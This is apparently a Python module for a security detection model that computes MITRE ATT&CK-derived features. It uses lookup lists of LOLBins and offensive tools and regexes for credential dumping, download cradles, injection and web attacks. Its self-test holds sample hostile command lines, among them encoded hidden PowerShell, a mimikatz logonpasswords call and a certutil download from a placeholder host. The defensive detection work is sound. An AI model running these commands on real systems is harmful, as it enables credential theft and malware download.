"""MITRE-derived boolean features.

Single source of truth for both training (extract_features.py) and runtime
(feature_row.py). Each feature is a content-pattern check that generalises
across novel events — substring/regex matches, not exact-string lookups.

All features return Int8 (0 or 1). Naming convention:
  image_is_*       — process image basename matches a list
  parent_is_*      — parent image matches a list
  cmd_has_*        — command line matches a regex
  target_in_*      — file/registry target path starts with / contains
  target_*         — semantic property of target (run_key, etc.)
  ext_is_*         — object_name_ext membership
  ext_*_suspicious — extension shape (double-ext, etc.)
  uri_has_*        — http_uri regex
  net_*            — network shape (port, external endpoint)

To add a new feature:
  1. Add to FEATURES dict below
  2. Add to FEATURE_NAMES (for stable ordering)
  3. Update tests with a positive case
"""
from __future__ import annotations

import re
from typing import Callable

# ──────────────────────────────────────────────────────────────────────────
# Lookup sets (lower-cased)
# ──────────────────────────────────────────────────────────────────────────

LOLBINS = {
    "powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe", "cscript.exe",
    "mshta.exe", "rundll32.exe", "regsvr32.exe", "certutil.exe",
    "bitsadmin.exe", "wmic.exe", "schtasks.exe", "wevtutil.exe",
    "msbuild.exe", "installutil.exe", "msiexec.exe", "regasm.exe",
    "regsvcs.exe", "msxsl.exe", "ieexec.exe", "presentationhost.exe",
    "mavinject.exe", "control.exe", "atbroker.exe", "diskshadow.exe",
    "esentutl.exe", "extexport.exe", "extrac32.exe", "forfiles.exe",
    "ftp.exe", "hh.exe", "ie4uinit.exe", "ilasm.exe", "infdefaultinstall.exe",
    "jsc.exe", "makecab.exe", "microsoft.workflow.compiler.exe",
    "odbcconf.exe", "pcalua.exe", "pcwrun.exe", "presentationhost.exe",
    "register-cimprovider.exe", "scriptrunner.exe", "syncappvpublishingserver.exe",
    "tttracer.exe", "verclsid.exe", "xwizard.exe", "wsl.exe",
}

OFFENSIVE_TOOLS = {
    "mimikatz.exe", "rubeus.exe", "psexec.exe", "psexesvc.exe",
    "covenant.exe", "empire.exe", "sharpview.exe", "sharphound.exe",
    "seatbelt.exe", "bloodhound.exe", "kerbrute.exe", "impacket.exe",
    "cobaltstrike.exe", "beacon.exe", "winpeas.exe", "linpeas.exe",
    "purplesharp.exe", "sliver.exe", "havoc.exe",
}

OFFICE_BINARIES = {"winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
                   "msaccess.exe", "visio.exe", "publisher.exe"}

BROWSERS = {"chrome.exe", "msedge.exe", "firefox.exe", "iexplore.exe",
            "brave.exe", "opera.exe"}

SHELLS = {"cmd.exe", "powershell.exe", "pwsh.exe", "bash.exe", "sh.exe"}

RANSOMWARE_EXTS = {
    ".crypt", ".locked", ".encrypted", ".enc", ".aes", ".pay", ".pays",
    ".ryk", ".ryuk", ".lock", ".cry", ".crypto", ".wcry", ".wncry",
    ".wannacry", ".cerber", ".zepto", ".odin", ".thor", ".aesir",
    ".sage", ".globe", ".dharma", ".scl", ".decrypt", ".vault",
}

EXECUTABLE_EXTS = {".exe", ".dll", ".scr", ".ps1", ".vbs", ".bat",
                   ".cmd", ".js", ".jse", ".wsf", ".wsh", ".hta",
                   ".com", ".pif", ".cpl", ".msi"}

DOCUMENT_EXTS = {".docx", ".doc", ".xlsx", ".xls", ".pdf", ".pptx", ".ppt",
                 ".txt", ".rtf", ".odt", ".csv"}

RUN_KEY_PATTERNS = (
    r"\\currentversion\\run\b",
    r"\\currentversion\\runonce\b",
    r"\\currentversion\\runonceex\b",
    r"\\currentversion\\policies\\explorer\\run\b",
    r"\\winlogon\\(shell|userinit)\b",
)
SERVICES_PATTERN = r"\\services\\[^\\]+\\imagepath\b"
AUTORUN_LOCATIONS = (
    r"\\startup\\",
    r"\\start menu\\programs\\startup",
    r"\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup",
)


# ──────────────────────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────────────────────

def _basename(path):
    if not path:
        return ""
    p = str(path).replace("\\", "/").rstrip("/")
    return p.rsplit("/", 1)[-1].lower()


def _norm(s):
    return (s or "").lower()


def _ext(name):
    base = _basename(name)
    if not base or "." not in base:
        return ""
    return "." + base.rsplit(".", 1)[-1]


# ──────────────────────────────────────────────────────────────────────────
# Feature functions — each returns 0 or 1
# ──────────────────────────────────────────────────────────────────────────

def f_image_is_lolbin(image, **_):
    return int(_basename(image) in LOLBINS)


def f_image_is_offensive_tool(image, **_):
    return int(_basename(image) in OFFENSIVE_TOOLS)


def f_image_is_shell(image, **_):
    return int(_basename(image) in SHELLS)


def f_parent_is_office(parent_image, **_):
    return int(_basename(parent_image) in OFFICE_BINARIES)


def f_parent_is_browser(parent_image, **_):
    return int(_basename(parent_image) in BROWSERS)


def f_parent_shell_child_lolbin(parent_image, image, **_):
    return int(_basename(parent_image) in SHELLS and _basename(image) in LOLBINS)


def f_parent_office_child_shell(parent_image, image, **_):
    return int(_basename(parent_image) in OFFICE_BINARIES and _basename(image) in SHELLS)


def f_target_in_temp(target, **_):
    t = _norm(target).replace("\\", "/")
    return int("/temp/" in t or "/tmp/" in t or "appdata/local/temp" in t)


def f_target_in_appdata(target, **_):
    t = _norm(target).replace("\\", "/")
    return int("/appdata/" in t)


def f_target_in_system32(target, **_):
    t = _norm(target).replace("\\", "/")
    return int("/system32/" in t or "/syswow64/" in t)


def f_target_in_user_profile(target, **_):
    t = _norm(target).replace("\\", "/")
    return int(re.search(r"/users/[^/]+/", t) is not None)


def f_target_unc_path(target, **_):
    t = (target or "")
    return int(t.startswith("\\\\") or t.startswith("//"))


def f_ext_is_ransomware(target, **_):
    return int(_ext(target) in RANSOMWARE_EXTS)


def f_ext_is_executable(target, **_):
    return int(_ext(target) in EXECUTABLE_EXTS)


def f_ext_is_document(target, **_):
    return int(_ext(target) in DOCUMENT_EXTS)


def f_ext_double_suspicious(target, **_):
    """Filename like 'invoice.doc.exe' — document extension followed by an
    executable extension."""
    base = _basename(target)
    if base.count(".") < 2:
        return 0
    parts = base.split(".")
    if len(parts) < 3:
        return 0
    second_last = "." + parts[-2]
    last = "." + parts[-1]
    return int(second_last in DOCUMENT_EXTS and last in EXECUTABLE_EXTS)


_CMD_ENC_RE = re.compile(r"\bpowershell(?:\.exe)?\b[^|]*?\s-e(?:c|n|nc|nco|ncod|ncodedcommand)?\b",
                         re.IGNORECASE)
_CMD_IEX_RE = re.compile(r"\b(?:iex|invoke-expression)\b", re.IGNORECASE)
_CMD_DOWNLOAD_RE = re.compile(
    r"\b(downloadstring|downloadfile|webclient|webrequest|invoke-webrequest|iwr|curl|wget|certutil[^|]+(?:-urlcache|-decode|-encode)|bitsadmin[^|]+(?:transfer|/transfer))\b",
    re.IGNORECASE)
_CMD_BASE64_RE = re.compile(r"[A-Za-z0-9+/=]{60,}")
_CMD_PIPE_SHELL_RE = re.compile(r"\|\s*(bash|sh|cmd|powershell|pwsh)\b", re.IGNORECASE)
_CMD_HIDDEN_RE = re.compile(r"\s-w(?:indowstyle)?\s+hidden\b", re.IGNORECASE)
_CMD_BYPASS_RE = re.compile(r"\s-ex(?:ecutionpolicy)?\s+bypass\b", re.IGNORECASE)
_CMD_NOPROFILE_RE = re.compile(r"\s-n(?:o)?p(?:rofile)?\b", re.IGNORECASE)
_CMD_HTTP_RE = re.compile(r"https?://", re.IGNORECASE)
_CMD_NEW_OBJECT_RE = re.compile(r"\bnew-object\b", re.IGNORECASE)


def f_cmd_has_enc(command_line, **_):
    return int(bool(command_line and _CMD_ENC_RE.search(command_line)))


def f_cmd_has_iex(command_line, **_):
    return int(bool(command_line and _CMD_IEX_RE.search(command_line)))


def f_cmd_has_downloadstring(command_line, **_):
    return int(bool(command_line and _CMD_DOWNLOAD_RE.search(command_line)))


def f_cmd_has_base64_blob(command_line, **_):
    return int(bool(command_line and _CMD_BASE64_RE.search(command_line)))


def f_cmd_has_pipe_shell(command_line, **_):
    return int(bool(command_line and _CMD_PIPE_SHELL_RE.search(command_line)))


def f_cmd_has_hidden(command_line, **_):
    return int(bool(command_line and _CMD_HIDDEN_RE.search(command_line)))


def f_cmd_has_bypass(command_line, **_):
    return int(bool(command_line and _CMD_BYPASS_RE.search(command_line)))


def f_cmd_has_noprofile(command_line, **_):
    return int(bool(command_line and _CMD_NOPROFILE_RE.search(command_line)))


def f_cmd_has_url(command_line, **_):
    return int(bool(command_line and _CMD_HTTP_RE.search(command_line)))


def f_cmd_has_new_object(command_line, **_):
    return int(bool(command_line and _CMD_NEW_OBJECT_RE.search(command_line)))


def f_target_run_key(registry_key, **_):
    if not registry_key:
        return 0
    rk = registry_key.lower()
    return int(any(re.search(p, rk) for p in RUN_KEY_PATTERNS))


def f_target_services_imagepath(registry_key, **_):
    if not registry_key:
        return 0
    return int(bool(re.search(SERVICES_PATTERN, registry_key.lower())))


def f_target_autorun_location(target, **_):
    if not target:
        return 0
    t = target.lower().replace("\\", "/")
    return int(any(p in t for p in (loc.lower() for loc in AUTORUN_LOCATIONS)))


_URI_SQLI_RE = re.compile(
    r"(?i)(union\s+select|updatexml|extractvalue|or\s+1\s*=\s*1|';?\s*--|select.*\bfrom\b|benchmark\(|sleep\()")
_URI_XSS_RE = re.compile(r"(?i)(<script|javascript:|on(error|load|click|focus)\s*=)")
_URI_TRAVERSAL_RE = re.compile(r"(?i)(\.\./|\.\.\\|%2e%2e%2f|%2e%2e/)")
_URI_ENCSHELL_RE = re.compile(r"(?i)(\.aspx\?cmd|\.php\?cmd|/cmd\.exe\?|/shell\.jsp|/c99\.php|/r57\.php)")


def f_uri_has_sqli(http_uri, **_):
    return int(bool(http_uri and _URI_SQLI_RE.search(http_uri)))


def f_uri_has_xss(http_uri, **_):
    return int(bool(http_uri and _URI_XSS_RE.search(http_uri)))


def f_uri_has_traversal(http_uri, **_):
    return int(bool(http_uri and _URI_TRAVERSAL_RE.search(http_uri)))


def f_uri_has_webshell(http_uri, **_):
    return int(bool(http_uri and _URI_ENCSHELL_RE.search(http_uri)))


# Credential dumping markers — caught both in command_line and as the image
# being mimikatz/rubeus. Multiple keywords because attackers use module
# names directly: "sekurlsa::logonpasswords", "lsadump::secrets", etc.
_CMD_CREDDUMP_RE = re.compile(
    r"(?i)(sekurlsa::|lsadump::|dpapi::|kerberos::|crypto::|misc::|"
    r"lsa\s+secrets|sam\s+dump|hashdump|invoke-mimikatz|getsystem|"
    r"comsvcs\.dll[^\"']*MiniDump|procdump.*lsass|"
    r"asktgt|kerberoast|asreproast|getticket)")


def f_cmd_has_creddump(command_line, **_):
    return int(bool(command_line and _CMD_CREDDUMP_RE.search(command_line)))


# Scheduled-task creation pattern (T1053.005)
_CMD_SCHTASK_CREATE_RE = re.compile(
    r"(?i)\bschtasks(?:\.exe)?\b[^|]*?\s+/(?:create|change|run)\b")


def f_cmd_has_schtask_create(command_line, **_):
    return int(bool(command_line and _CMD_SCHTASK_CREATE_RE.search(command_line)))


# Process injection / token theft markers
_CMD_INJECTION_RE = re.compile(
    r"(?i)(createremotethread|writeprocessmemory|virtualallocex|"
    r"setwindowshook|reflectivedll|invoke-shellcode|invoke-dllinjection|"
    r"openprocess\(.*?process_all_access|getprocaddress.*loadlibrary)")


def f_cmd_has_injection(command_line, **_):
    return int(bool(command_line and _CMD_INJECTION_RE.search(command_line)))


# Log-clearing / defense evasion (T1070.001)
_CMD_LOG_CLEAR_RE = re.compile(
    r"(?i)\bwevtutil(?:\.exe)?\b[^|]*?\s+(?:cl|clear-log)\b|"
    r"clear-eventlog|wmic\s+nteventlog\s+where[^|]*?cleareventlog|"
    r"fsutil\s+usn\s+deletejournal|format\s+/q\s+\w:")


def f_cmd_has_log_clear(command_line, **_):
    return int(bool(command_line and _CMD_LOG_CLEAR_RE.search(command_line)))


# Recon command patterns (T1087, T1018, T1049)
_CMD_RECON_RE = re.compile(
    r"(?i)\b(whoami\s+(?:/all|/groups|/priv)|net\s+(?:user|group|localgroup|view|session)|"
    r"nltest\s+/d|systeminfo|tasklist\s+/v|netstat\s+-an|"
    r"ipconfig\s+/all|route\s+print|arp\s+-a|qwinsta|query\s+user|"
    r"get-aduser|get-adcomputer|get-adgroup|adfind)")


def f_cmd_has_recon(command_line, **_):
    return int(bool(command_line and _CMD_RECON_RE.search(command_line)))


# ──────────────────────────────────────────────────────────────────────────
# Registry — ordered tuple drives schema column order
# ──────────────────────────────────────────────────────────────────────────

FEATURES: dict[str, Callable] = {
    "f_image_is_lolbin": f_image_is_lolbin,
    "f_image_is_offensive_tool": f_image_is_offensive_tool,
    "f_image_is_shell": f_image_is_shell,
    "f_parent_is_office": f_parent_is_office,
    "f_parent_is_browser": f_parent_is_browser,
    "f_parent_shell_child_lolbin": f_parent_shell_child_lolbin,
    "f_parent_office_child_shell": f_parent_office_child_shell,
    "f_target_in_temp": f_target_in_temp,
    "f_target_in_appdata": f_target_in_appdata,
    "f_target_in_system32": f_target_in_system32,
    "f_target_in_user_profile": f_target_in_user_profile,
    "f_target_unc_path": f_target_unc_path,
    "f_ext_is_ransomware": f_ext_is_ransomware,
    "f_ext_is_executable": f_ext_is_executable,
    "f_ext_is_document": f_ext_is_document,
    "f_ext_double_suspicious": f_ext_double_suspicious,
    "f_cmd_has_enc": f_cmd_has_enc,
    "f_cmd_has_iex": f_cmd_has_iex,
    "f_cmd_has_downloadstring": f_cmd_has_downloadstring,
    "f_cmd_has_base64_blob": f_cmd_has_base64_blob,
    "f_cmd_has_pipe_shell": f_cmd_has_pipe_shell,
    "f_cmd_has_hidden": f_cmd_has_hidden,
    "f_cmd_has_bypass": f_cmd_has_bypass,
    "f_cmd_has_noprofile": f_cmd_has_noprofile,
    "f_cmd_has_url": f_cmd_has_url,
    "f_cmd_has_new_object": f_cmd_has_new_object,
    "f_target_run_key": f_target_run_key,
    "f_target_services_imagepath": f_target_services_imagepath,
    "f_target_autorun_location": f_target_autorun_location,
    "f_uri_has_sqli": f_uri_has_sqli,
    "f_uri_has_xss": f_uri_has_xss,
    "f_uri_has_traversal": f_uri_has_traversal,
    "f_uri_has_webshell": f_uri_has_webshell,
    "f_cmd_has_creddump": f_cmd_has_creddump,
    "f_cmd_has_schtask_create": f_cmd_has_schtask_create,
    "f_cmd_has_injection": f_cmd_has_injection,
    "f_cmd_has_log_clear": f_cmd_has_log_clear,
    "f_cmd_has_recon": f_cmd_has_recon,
}

FEATURE_NAMES: list[str] = list(FEATURES.keys())


def compute(image=None, parent_image=None, command_line=None,
            target=None, registry_key=None, http_uri=None,
            **_extra) -> dict[str, int]:
    """Compute all engineered booleans for one event. Pass the relevant
    parsed fields by keyword; missing fields default to None.

    Returns {feature_name: 0|1} in stable order."""
    args = dict(image=image, parent_image=parent_image,
                command_line=command_line, target=target,
                registry_key=registry_key, http_uri=http_uri)
    return {name: fn(**args) for name, fn in FEATURES.items()}


def count_positives(features: dict[str, int]) -> int:
    """How many booleans fired. Used for label-by-count."""
    return sum(int(v) for v in features.values())


# ──────────────────────────────────────────────────────────────────────────
# Self-test
# ──────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    # Quick sanity for a few representative events
    cases = [
        ("powershell -enc payload",
         dict(image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
              command_line="powershell -nop -w hidden -enc SQBFAFgAIAAoAE4ALgBkAA==")),
        ("mimikatz",
         dict(image=r"C:\Tools\mimikatz.exe",
              command_line='mimikatz "sekurlsa::logonpasswords" exit')),
        (".locked ransomware",
         dict(image=r"C:\bad.exe",
              target=r"C:\Users\bob\report.pdf.locked")),
        ("certutil download",
         dict(image=r"C:\Windows\System32\certutil.exe",
              command_line="certutil -urlcache -split -f http://x/y.exe c:\\y.exe")),
        ("benign chrome renderer",
         dict(image=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              command_line="chrome --type=renderer")),
        ("schtasks persistence",
         dict(image=r"C:\Windows\System32\schtasks.exe",
              command_line='schtasks /create /sc minute /tn evil /tr c:\\bad.exe')),
        ("legit svchost",
         dict(image=r"C:\Windows\System32\svchost.exe",
              command_line="svchost -k netsvcs -p -s wuauserv")),
    ]
    for label, kw in cases:
        feats = compute(**kw)
        n = count_positives(feats)
        fired = [k for k, v in feats.items() if v]
        print(f"{label:<40} count={n:>2}  fired={fired}")
